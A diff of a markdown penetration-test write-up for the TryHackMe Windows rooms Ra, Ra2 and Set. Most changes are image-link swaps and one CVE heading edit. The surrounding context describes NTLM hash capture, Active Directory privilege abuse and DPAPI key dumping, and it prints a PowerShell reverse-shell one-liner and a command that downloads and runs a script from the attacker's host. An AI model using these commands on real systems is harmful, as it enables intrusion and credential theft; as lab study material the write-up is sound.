@@ -46,8 +46,8 @@ This report details the findings, methodologies, and steps taken during the pene
 # Ra
 
 > https://tryhackme.com/r/room/ra
-> 
-![Pasted image 20240807192728](https://github.com/user-attachments/assets/46d10860-6bf0-45ca-8d9b-05473e9bdfa4)
+ 
+![f8cc5f48d1b4cf162c24c6964dfe0718](https://github.com/user-attachments/assets/8cca808a-f17a-42fb-ae4e-dc9c85d971d1)
 
 You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
 
@@ -481,16 +481,16 @@ In the http://windcorp.thm:80/ page, which serves as a default company portal, t
 
 2. **Reset Password Button**: The page features a "Reset Password" button. Clicking this button redirects users to a different web page, http://fire.windcorp.thm/reset.asp.
 
-![Pasted image 20240807194639](https://github.com/user-attachments/assets/0e7a7bcd-c0bb-49fa-a4fa-e3e355f74e93)
+![Pasted image 20240807194639](https://github.com/user-attachments/assets/b64d9909-52de-41ec-869f-7b405c485611)
 
 ### Admin Center
 On accessing https://windcorp.thm:443, the page prompts for authentication. 
 
-![Pasted image 20240807200101](https://github.com/user-attachments/assets/da325357-3404-47c8-8a41-00e7bbc99667)
+![Pasted image 20240807200101](https://github.com/user-attachments/assets/a6c2a359-b7fa-42dc-8fb6-b7680df37ac5)
 
 Once valid credentials are provided, users are granted access to the Windows Admin portal.
 
-![Pasted image 20240807203938](https://github.com/user-attachments/assets/51009164-9969-4617-9e33-c65389abe780)
+![Pasted image 20240807203938](https://github.com/user-attachments/assets/8739b95b-82da-4a34-bdaf-b03c0b8eae83)
 
 per microsoft: 
 
@@ -502,7 +502,7 @@ Unauthorized access to Windows Admin Center can lead to critical risks, compromi
 
 The URL http://windcorp.thm:9090 leads to the Openfire Admin Console login page. Openfire is an XMPP server that facilitates real-time messaging and collaboration. The Admin Console is a web-based interface used to manage and configure the Openfire server, including user accounts, server settings, and various other administrative functions.
 
-![Pasted image 20240807200536](https://github.com/user-attachments/assets/aeb0fbaa-9e4f-4a25-b558-521df3dfe0a7)
+![Pasted image 20240807200536](https://github.com/user-attachments/assets/b433d628-1ea1-47fd-ab4f-b4dae99249d3)
 
 ### Windcorp Fire Web Page
 
@@ -510,7 +510,7 @@ The page at http://fire.windcorp.thm/reset.asp, which is reached via a redirecti
 
 The security questions used are weak and could potentially be guessed or discovered through Open Source Intelligence.
 
-![Pasted image 20240807201932](https://github.com/user-attachments/assets/4ea2a73a-08bb-4aa4-a8a4-3e600fd532c2)
+![Pasted image 20240807201932](https://github.com/user-attachments/assets/1efc15af-ca76-4667-b878-7c8032964173)
 
 One of the questions asks for the user's favorite pet name. An employee named Lily Levesque has a dog named Sparky, as evidenced by her picture on the company portal.
 
@@ -518,13 +518,13 @@ Using this information, I successfully answered the security question, which all
 
 This vulnerability allows unauthorized users to not only reset passwords but also see the new password immediately, facilitating unauthorized access to user accounts.
 
-![Pasted image 20240807202251](https://github.com/user-attachments/assets/0fb846ab-6a69-4c39-9b54-0f601ca3e7ff)
+![Pasted image 20240807202251](https://github.com/user-attachments/assets/10c43c20-ca6a-40a3-9ccd-3896dcf6f779)
 
 ### SMB Shares Ra
 
 With the newly obtained credentials, I was able to access and enumerate SMB shares on port 445. This could potentially reveal sensitive files or directories that are accessible due to misconfigured permissions or other security weaknesses.
 
-![Pasted image 20240807203039](https://github.com/user-attachments/assets/a5c11b78-6c73-4ce1-8e71-7e7e0e0833bc)
+![Pasted image 20240807203039](https://github.com/user-attachments/assets/ad33d538-8aab-4d59-9c47-8e49d9d82ca8)
 
 #### //windcorp.thm/Shared
 
@@ -591,7 +591,7 @@ The "Users" share had a collection of individual home directories. Each director
 
 ### Spark Application
 
-![Pasted image 20240807210750](https://github.com/user-attachments/assets/9e4218df-9c75-4a4d-a46a-941c6d93b0b4)
+![Pasted image 20240807210750](https://github.com/user-attachments/assets/357a42a0-21b2-4946-b16e-58b55625c2c3)
 
 After downloading and installing the software, I logged in using the credentials obtained from the earlier password reset process, which were associated with the user account lilyle@windcorp.thm. This allowed access to the Spark client and the company’s internal messaging system.
 
@@ -606,9 +606,9 @@ A chat message can include an IMG element with a SRC attribute referencing an ex
 
 The company portal indicated that _buse candan_ (buse@fire.windcorp.thm) was online at the time. Therefore, I ran [Responder](https://github.com/lgandx/Responder), delivered the payload to him, and attempted to capture the NTLMv2 authentication.
 
-![Pasted image 20240807213035](https://github.com/user-attachments/assets/b7514a29-c03d-4166-9b19-2a23ea65a593)
+![Pasted image 20240807213035](https://github.com/user-attachments/assets/0044cdb7-fe6b-4a8c-b32d-c16ce3071bcd)
 
-![Pasted image 20240807212929](https://github.com/user-attachments/assets/4bb3dc51-273a-4154-8b36-1b2d0d42a6fc)
+![Pasted image 20240807212929](https://github.com/user-attachments/assets/70476f2d-e033-47b7-a08e-ce41cb89d86a)
 
 ### Initial Access Ra
 
@@ -622,14 +622,14 @@ B010100000000000037e5f79929e9da01cdc4e33c85a0eb350000000002000800420036004b00330
 
 I confirmed that it was possible to establish a remote PowerShell session, then logged in as Buse.
 
-![Pasted image 20240807214050](https://github.com/user-attachments/assets/b0ace065-668f-4bc7-89e1-dc7129ad3319)
+![Pasted image 20240807214050](https://github.com/user-attachments/assets/b158cb3e-9b8d-4b90-89b5-f4d54893358a)
 
-![Pasted image 20240807214327](https://github.com/user-attachments/assets/4d68a639-e4b2-40d4-9a33-ddcf8c3b3c8f)
+![Pasted image 20240807214327](https://github.com/user-attachments/assets/f81e985c-fc4a-43e2-a062-d48df4a855b4)
 
 
 ### Post-Exploitation
 
-![Pasted image 20240807215505](https://github.com/user-attachments/assets/11c91317-a80e-493f-93a8-17883028f4f6)
+![Pasted image 20240807215505](https://github.com/user-attachments/assets/b967c3ed-2657-4370-8629-bd3361133e52)
 
 The `BULTIN\Account Operators` group by default has privileges to login to DCs and manage all non-protected users & groups.
 
@@ -762,7 +762,7 @@ $ Set-ADAccountPassword -Identity brittanycr -Reset -NewPassword (ConvertTo-Secu
 
 Unfortunately, the user `brittanycr` lacked WinRM privileges, so I needed to create a `hosts.txt` and transfer it to her home directory. I leveraged the previously discovered SMB share to move the file into place.
 
-![Pasted image 20240807224234](https://github.com/user-attachments/assets/0928748a-c8a9-498d-9ca4-d3ebcb1d4407)
+![Pasted image 20240807224234](https://github.com/user-attachments/assets/e236a043-8ca6-4af5-afcb-a94dcd32969b)
 
 #### hosts.txt
 
@@ -774,7 +774,7 @@ After transferring the file to `brittanycr`'s home directory, I waited a few min
 
 Once it runs, the command injection triggered the payload, effectively, granting me membership of both `WINDCORP\Domain Admins` and `BUILTIN\Administrators`.
 
-![Pasted image 20240807224817](https://github.com/user-attachments/assets/0185ee67-c815-4c2b-b63f-a7f5b71ea4fa)
+![Pasted image 20240807224817](https://github.com/user-attachments/assets/1825252c-d5fe-4bd9-9921-adf937d7b35c)
 
 ### Goal Execution Ra
 
@@ -798,25 +798,25 @@ I also extracted the DPAPI keys using the command `lsadump::backupkeys /system:l
 
 With the obtained password hash `bfa4cae19504e0591ef0a523a1936cd4`, I used [nxc](https://github.com/Pennyw0rth/NetExec) again to verify if I could establish a PowerShell remote session as  `Administrator`.
 
-![Pasted image 20240807231249](https://github.com/user-attachments/assets/1753a358-6f28-4bca-a34d-b0fabf13f38d)
+![Pasted image 20240807231249](https://github.com/user-attachments/assets/01e486bc-b2b1-4e43-a0a8-f02be22aa1ea)
 
 Since I could not access the system via RDP without a password, I bypassed this limitation by editing the registry through my WinRM shell. This approach allowed me to modify settings directly from the command line to enable RDP access or make other necessary adjustments.
 
-![Pasted image 20240807232154](https://github.com/user-attachments/assets/e754ca5f-9fba-456a-93e7-2c28c7fd576c)
+![Pasted image 20240807232154](https://github.com/user-attachments/assets/ed5a228b-8080-46de-b094-de4de46c4655)
 
 ```powershell
 $ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
-![Pasted image 20240809023247](https://github.com/user-attachments/assets/0bf1727e-2d0d-41b5-893c-c3d3a036a0ba)
+![Pasted image 20240809023247](https://github.com/user-attachments/assets/a1cf7c58-75f8-42ec-abeb-0cb8257d884a)
 
 ---
 
 ## Ra2
 
 > https://tryhackme.com/r/room/ra2
-
-![d510be4de2e82a0fe052be89d43abcc1](https://github.com/user-attachments/assets/9a266541-66a7-4128-9d92-f6a082ac74b7)
+> 
+![d510be4de2e82a0fe052be89d43abcc1](https://github.com/user-attachments/assets/45d38c40-4200-4a00-a2c5-e89b6deb9dc8)
 
 WindCorp recently had a security-breach. Since then they have hardened their infrastructure, learning from their mistakes. But maybe not enough? You have managed to enter their local network...
 
@@ -1531,7 +1531,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 #### https://fire.windcorp.thm/
 
-![Pasted image 20240809040659](https://github.com/user-attachments/assets/c960cce8-18da-447e-bbce-026e436dd8ee)
+![Pasted image 20240809040659](https://github.com/user-attachments/assets/08f3b246-7124-48fe-a50f-b25f155b0f0e)
 
 The site claims that it is now secure and equipped with up-to-date software and backups. The management asserts that they have adopted new security measures, including:
 
@@ -1545,7 +1545,7 @@ Additionally, the previous password reset button now redirects to [selfservice](
 
 ##### https://fire.windcorp.thm/powershell
 
-![Pasted image 20240811005510](https://github.com/user-attachments/assets/0dc95466-123d-490c-b529-f7c2821682ce)
+![Pasted image 20240811005510](https://github.com/user-attachments/assets/eb5ac041-29db-4ab9-9dac-107f821f0ec3)
 
 This page provides us with a web interface for powershell.
 
@@ -1559,8 +1559,10 @@ _Windows PowerShell® Web Access, first introduced in Windows Server® 2012, act
 
 This subdomain prompted for HTTP authentication, and at that point, I did not have valid credentials.
 
-![Pasted image 20240810235617](https://github.com/user-attachments/assets/91a7eda8-cb08-4d80-b845-b7c9a883f041)
-![Pasted image 20240810235258](https://github.com/user-attachments/assets/e2714cb3-553b-4014-a4e7-967417871091)
+![Pasted image 20240810235617](https://github.com/user-attachments/assets/3f6b1650-8bfa-49c6-ba13-55d19e9d6a21)
+
+
+![Pasted image 20240810235258](https://github.com/user-attachments/assets/c628615b-07d5-464d-8d4d-bc944e27d2c7)
 
 intercepted request in burp shows: `NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=`, an NTLM authentication token. 
 
@@ -1570,7 +1572,7 @@ It is base64-encoded and used in NTLM authentication, a challenge-response proto
 
 ##### https://selfservice.dev.windcorp.thm/backup
 
-![Pasted image 20240810234320](https://github.com/user-attachments/assets/f1e07086-2422-4ac6-afa8-1cea0b18ea7c)
+![Pasted image 20240810234320](https://github.com/user-attachments/assets/d6c543eb-8fda-42a3-8093-82bc1d6d4bf7)
 
 This directory holds the `cert.pfx` file and `web.config`.
 
@@ -1580,11 +1582,11 @@ This process involved converting the `.pfx` file into a format that can be passe
 
 __cert.pfx hash cracked__
 
-![Pasted image 20240810030640](https://github.com/user-attachments/assets/09d35346-5184-415e-9882-537baec97df5)
+![Pasted image 20240810030640](https://github.com/user-attachments/assets/ce17656e-ee8b-4c94-898c-de202812163a)
 
 __extracted keys__
 
-![Pasted image 20240810233357](https://github.com/user-attachments/assets/e9f2b6d6-c0c3-4e85-87e2-957ebd797819)
+![Pasted image 20240810233357](https://github.com/user-attachments/assets/5c3b0295-a2db-420f-bebd-b75ecdf295f0)
 
 ### DNS Cache Poisoning
 
@@ -1592,7 +1594,7 @@ Based on the previous DNS output, It was possible to exploit vulnerabilities in 
 
 Following this change, a DNS query was performed to verify the update.
 
-![Pasted image 20240811011257](https://github.com/user-attachments/assets/fbc1dfbe-97fe-48d8-a6a1-51dd1b60f5de)
+![Pasted image 20240811011257](https://github.com/user-attachments/assets/70579ff5-d4e8-4b63-bb94-5c941d2f189f)
 
 ### NTLMv2 Authentication Intercept with MITM
 
@@ -1602,15 +1604,15 @@ The `.pem` keys included the private key and public certificate necessary for se
 
 After a few seconds, Responder captured an NTLMv2 hash for `edwardle`, which I cracked using the `rockyou` wordlist.
 
-![Pasted image 20240811012157](https://github.com/user-attachments/assets/0c5bd5b7-503a-4191-b272-08a0c3d89c37)
+![Pasted image 20240811012157](https://github.com/user-attachments/assets/4844a55f-9641-470d-b524-749b579844e8)
 
-![Pasted image 20240811012642](https://github.com/user-attachments/assets/e6b41d5d-e1a9-4567-9154-b3756305869b)
+![Pasted image 20240811012642](https://github.com/user-attachments/assets/98da5130-3c9f-45ae-be88-250ee09bd9d5)
 
 ### Initial Access Ra2
 
 I could established RCE on the machine by logging to the `Powershell Web Access` page with `edwardle` credentials.
 
-![Pasted image 20240811013844](https://github.com/user-attachments/assets/fdc3fc06-16af-429a-9963-1d5d5b5a0bf1)
+![Pasted image 20240811013844](https://github.com/user-attachments/assets/154098db-db6a-484b-b294-4e4a5ec5e5d8)
 
 To obtain a reverse shell on the machine, i encoded the [Nishang](https://github.com/samratashok/nishang) script `Invoke-PowerShellTcpOneLine.ps1` in Base64, and transfered it via the PowerShell web interface 
 
@@ -1621,9 +1623,9 @@ $client = New-Object System.Net.Sockets.TCPClient($ip_addr,9001);$stream = $clie
 iex (New-Object Net.WebClient).DownloadString('http://$ip_addr/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
 
-![Pasted image 20240811021147](https://github.com/user-attachments/assets/b466a7d4-77b1-4c24-bbb8-8256a707145a)
+![Pasted image 20240811021147](https://github.com/user-attachments/assets/1301ae0e-df18-4131-8306-10c81b9e4844)
 
-![Pasted image 20240811021323](https://github.com/user-attachments/assets/ca69d4d3-fb3d-40f1-934b-ae5978c956f6)
+![Pasted image 20240811021323](https://github.com/user-attachments/assets/35331b89-410c-43cf-b3d1-45fc2fc63001)
 
 ### Abusing Access Tokens
 
@@ -1649,13 +1651,15 @@ This privilege is held by any process allows the impersonation (but not creation
 
 After downloading the reverse shell binary, I executed it with `PrintSpoofer`, granting me a remote connection as `windcorp\fire$`
 
-![Pasted image 20240811042829](https://github.com/user-attachments/assets/c26b3613-998f-4eaa-b2c0-d70649ae1990)
-![Pasted image 20240811042439](https://github.com/user-attachments/assets/8a360ab0-b9f4-4c24-8c33-5b57611705d4)
+![Pasted image 20240811042829](https://github.com/user-attachments/assets/017a7bc3-1e31-4cef-ab29-b87266285224)
+
+![Pasted image 20240811042439](https://github.com/user-attachments/assets/c270c2a8-d09e-4dad-829c-233869035119)
 
 ### Goal Execution Ra2
 
-![Pasted image 20240811044619](https://github.com/user-attachments/assets/7a850af1-b9d2-449d-bba3-e849b202a7bf)
-![Pasted image 20240811050122](https://github.com/user-attachments/assets/aec116b2-e89b-47bd-934e-ef180ff55828)
+![Pasted image 20240811044619](https://github.com/user-attachments/assets/2b5ce836-c80b-45df-95d3-dd8d78bcd0f4)
+
+![Pasted image 20240811050122](https://github.com/user-attachments/assets/075c42b0-e991-4af6-b4d7-5a0be3568a1a)
 
 ---
 
@@ -1663,7 +1667,7 @@ After downloading the reverse shell binary, I executed it with `PrintSpoofer`, g
 
 > https://tryhackme.com/r/room/set
 
-![b24d17051176c781124f199e22213b1f](https://github.com/user-attachments/assets/a89ac14b-0c43-43a5-bb80-336916aacf45)
+![b24d17051176c781124f199e22213b1f](https://github.com/user-attachments/assets/3388b102-9530-40b7-a1c8-ceae6a6008ef)
 
 Once again you find yourself on the internal network of the Windcorp Corporation. This tasted so good last time you were there, you came back for more.
 
@@ -1777,17 +1781,17 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Upon visiting the web page at `set.windcorp.thm`, Wappalyzer identified several technologies in use. The site is running on **Microsoft IIS**.
 
-![Pasted image 20240812170054](https://github.com/user-attachments/assets/d55b86f5-e05f-4102-b4da-4125bf5b35a0)
+![Pasted image 20240812170054](https://github.com/user-attachments/assets/f0bfd019-59c9-4946-9160-c9b1524969f1)
 
 ### Webpage Enumeration
 
 While exploring the web page, i discovered that the `assets/data/users.xml` file contained a collection of user information, including phone numbers and email addresses associated with the company.
 
-![Pasted image 20240812172637](https://github.com/user-attachments/assets/991e376e-b640-4e69-88b1-1b56d9b3c7e4)
+![Pasted image 20240812172637](https://github.com/user-attachments/assets/c551a2d2-2816-4262-973e-e5c510edf379)
 
 The `appnotes.txt` file contained a note about password complexity, advising users to change their default password immediately because it is considered too common.
 
-![Pasted image 20240812182301](https://github.com/user-attachments/assets/e51e45de-b179-4494-9485-6a3ee166de0c)
+![Pasted image 20240812182301](https://github.com/user-attachments/assets/83f46193-7b40-4147-9321-c515428faeec)
 
 ### SMB Shares Set
 
@@ -1799,7 +1803,7 @@ _"Zip and save your project files here. We will review them."_
 
 This suggests that any ZIP files dropped in this location are likely to be accessible and reviewed, potentially exposing an attack surface if these files are processed or extracted by the system.
 
-![Pasted image 20240812180540](https://github.com/user-attachments/assets/7a3bae0e-9ec0-41fc-92c3-35366bf5e598)
+![Pasted image 20240812180540](https://github.com/user-attachments/assets/c3fae6e2-5410-4022-b8df-26ac355d483a)
 
 ### Initial Access Set
 
@@ -1809,11 +1813,11 @@ Reference:
 
 I created a malicious `.lnk` file that exploits how Windows handles shortcut icons. By setting the icon path to a network share controlled by me, the target machine attempts to retrieve the icon, triggering NTLM authentication requests to my server. This allowed me to capture the machine’s authentication credentials.
 
-![Pasted image 20240812183056](https://github.com/user-attachments/assets/4ef6ff3a-3735-4910-a755-a4466f31790e)
+![Pasted image 20240812183056](https://github.com/user-attachments/assets/2a97ba0f-c93f-4844-9ae2-d0ce7fed2c01)
 
 After dropping the malicious ZIP file into the share, _Responder_ captured an NTLM hash for the user `MichelleWat`.
 
-![Pasted image 20240812183800](https://github.com/user-attachments/assets/aa2f355b-8091-482e-8e64-1ee43bceabb7)
+![Pasted image 20240812183800](https://github.com/user-attachments/assets/214ed5e8-f786-4aa9-88e7-2a39564eeb1d)
 
 ### Internal Enumeration
 
@@ -1821,7 +1825,7 @@ The active connections on the machine showed that port 2805 was listening on loc
 
 This process was identified as `Veeam.One.Agent.Service`.
 
-![Pasted image 20240812190045](https://github.com/user-attachments/assets/9dc65bcd-b9d7-45b0-b7d3-d03489cfd4da)
+![Pasted image 20240812190045](https://github.com/user-attachments/assets/58e201ed-7f36-48b4-a2bc-e0ee054a45e9)
 
 __References__:
 
@@ -1833,9 +1837,9 @@ Veeam ONE Client comes as a part of the integrated Veeam ONE solution. It is the
 
 Both the file version and product version were listed as `9.5.4.4566`.
 
-![Pasted image 20240813203244](https://github.com/user-attachments/assets/1773311d-1f35-422f-98c3-204a7107975a)
+![Pasted image 20240813203244](https://github.com/user-attachments/assets/5fae1971-7846-4933-b347-6d1874e525d0)
 
-### CVE-2020-10915
+### CVE-2020-10914
 
 Veeam ONE Agent uses .NET data serialization mechanisms. The remote attacker may send malicious code to the TCP port opened by Veeam ONE Agent (TCP 2805 by default) which will not be deserialized properly.
 
@@ -1843,7 +1847,7 @@ The deserialization of untrusted data is performed during TLS Handshake (vulnera
 
 Since Veeam was running on localhost, [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) was used to establish an SSH tunnel to the attacking machine. This forwarded port 2805, allowing me to access the Veeam service remotely through the tunnel.
 
-![Pasted image 20240814005504](https://github.com/user-attachments/assets/72a2b732-85b0-43ce-965e-4b475e83e8d3)
+![Pasted image 20240814005504](https://github.com/user-attachments/assets/64638af3-a405-46ff-a0a7-7cf6a9c0934d)
 
 ### Privilege Escalation Set
 
@@ -1897,9 +1901,9 @@ The program is designed to download and execute a payload from a remote server. 
 
 When uploading the compiled executable to VirusTotal, it showed that the file bypassed detection by the Microsoft/McAfee scanner, which was the AV solution deployed on the machine.
 
-![Pasted image 20240813212416](https://github.com/user-attachments/assets/b0eef4eb-a453-439a-a524-502b042e3dd0)
+![Pasted image 20240813212416](https://github.com/user-attachments/assets/96bcafd1-2f45-49fd-be92-11f2c990d6ff)
 
-![Pasted image 20240813212306](https://github.com/user-attachments/assets/105f228d-6a08-4d92-8f1a-d46d8438f896)
+![Pasted image 20240813212306](https://github.com/user-attachments/assets/01a7581d-0d5c-4e60-b684-8ddcc2e65567)
 
 __Modified Ruby Script__
 
@@ -2108,27 +2112,27 @@ end
 ```
 With the exploit script correctly configured and Metasploit updated with the necessary details, a simple ping command was executed to ensure that the attack chain functioned as intended.
 
-![Pasted image 20240814004521](https://github.com/user-attachments/assets/d6efbb4b-5d04-4ac7-a0b2-3f3510d72255)
+![Pasted image 20240814004521](https://github.com/user-attachments/assets/1c032d5a-e768-48eb-b791-03d39bd44ce3)
 
 After receiving the ICMP packets and confirming that command execution was working correctly, i proceed to escalate our privileges by executing the stager.
 
 This step involved leveraging the permissions associated with the service, which granted me a reverse shell with the same privileges as the service owner.
 
-![Pasted image 20240814004555](https://github.com/user-attachments/assets/0249e708-a4ee-4c5f-9f03-dca64522d0ff)
+![Pasted image 20240814004555](https://github.com/user-attachments/assets/c3f767f5-c6a8-4149-8d86-d072f9a8e23a)
 
 ### Goal Execution Set
 
 After executing the payload, I obtained a reverse shell as `set\one`, who was a member of several privileged groups. This elevated access allowed me to further escalate privileges, gaining a shell as `Administrator` and securing RDP access to the system.
 
-![Pasted image 20240814005951](https://github.com/user-attachments/assets/679145b6-df63-49a2-bb88-1d3cb0d4a4ad)
+![Pasted image 20240814005951](https://github.com/user-attachments/assets/ff07f6dc-023c-44c8-91f5-25b1bbd4a6b9)
 
 After gaining administrative access, i've dumped the SAM database, which contains password hashes for all users on the system.
 
-![Pasted image 20240814015418](https://github.com/user-attachments/assets/d7a8fdd2-b367-491d-b741-7fcbd431112c)
+![Pasted image 20240814015418](https://github.com/user-attachments/assets/ebd51916-8c31-4f49-a16c-4c3956a7e02f)
 
 Thanks to my SSH tunnel, I could access the RDP service, which was also exposed on localhost.
 
-![Pasted image 20240814031150](https://github.com/user-attachments/assets/31cfc358-ef4b-4154-8a24-f1eb1d0708b2)
+![Pasted image 20240814031150](https://github.com/user-attachments/assets/b16432bb-e660-42d2-a366-a9909c5c224f)
 
 Visual evidence of the compromised system.
 
@@ -2136,5 +2140,5 @@ Visual evidence of the compromised system.
 
 Loading ...
 
-![windows-xp-loading-screen](https://github.com/user-attachments/assets/b22dd31d-df3d-4634-a475-fcaddf98c058)
+![db6dw1k-47c4d90d-f5b5-4b31-a06e-2c2c0dc30501-1767443185](https://github.com/user-attachments/assets/6587eb11-ad08-4fbf-9dc6-d00ee62e21fb)
 
